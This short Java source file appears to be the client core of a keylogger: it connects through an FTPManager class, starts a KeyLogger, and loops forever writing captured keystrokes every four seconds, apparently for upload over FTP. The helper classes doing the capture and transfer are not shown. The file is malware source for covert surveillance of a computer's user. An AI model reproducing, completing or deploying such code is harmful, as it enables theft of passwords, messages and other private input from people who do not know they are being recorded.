package org.dot;

public class Client {

	public Client() {
		try {
			if (!FTPManager.connect())
				throw new Exception("Failed to connect.");
			else
				System.out.println("Connected.");
			
			KeyLogger.start();

			do {
				Thread.sleep(4000);
				KeyLogger.write();
			} while (true);
			
		} catch (Exception e) {
			e.printStackTrace();
		}
		
	}

}
